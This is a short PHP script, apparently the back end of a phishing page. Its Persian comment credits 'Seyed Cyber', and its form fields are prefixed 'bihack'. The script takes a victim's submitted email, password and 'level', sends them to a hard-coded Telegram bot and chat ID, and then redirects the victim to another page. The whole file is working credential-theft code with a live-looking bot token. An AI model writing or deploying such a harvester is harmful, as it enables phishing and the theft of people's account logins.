<?php

/*
کد نویسی شده توسط سید سایبر
*/

$leveleseyed=$_POST['bihacklevel'];
$emailseyed=$_POST['bihackemail'];
$passseyed=$_POST['bihackpass'];

$token = "1542016660:AAE7Y3R3XvlW9xDaChcO2IwQf3bx-19asas";
$chatid = "1190074423";
$text = "level | $levelseyed | email | $emailseyed | password | $passseyed |";

$ok = file_get_contents("https://api.telegram.org/bot$token/SendMessage?chat_id=$chatid&text=$text");

header("Location: index2.html");
?>
